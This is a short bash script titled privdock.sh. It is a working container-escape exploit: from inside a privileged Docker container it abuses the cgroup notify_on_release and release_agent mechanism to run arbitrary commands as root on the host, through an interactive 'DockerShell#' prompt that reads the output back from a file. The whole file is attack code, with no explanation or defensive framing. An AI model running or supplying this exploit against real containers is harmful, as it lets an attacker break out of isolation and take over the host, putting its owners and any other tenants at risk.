#!/bin/bash

while true; do
    read -p "DockerShell#: " command
    if [[ -z $command ]]; then
        echo "privdock.sh <command>"
    else
        export d=$(dirname $(ls -x /s*/fs/c*/*/r* |head -n1))
        mkdir -p $d/w;echo 1 >$d/w/notify_on_release
        export t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
        touch /o
        echo $t/c >$d/release_agent
        printf "#!/bin/sh\n$command >""$t/o" >/c
        chmod +x /c
        sh -c "echo 0 >$d/w/cgroup.procs"
        sleep 1
        cat /o
      fi
done
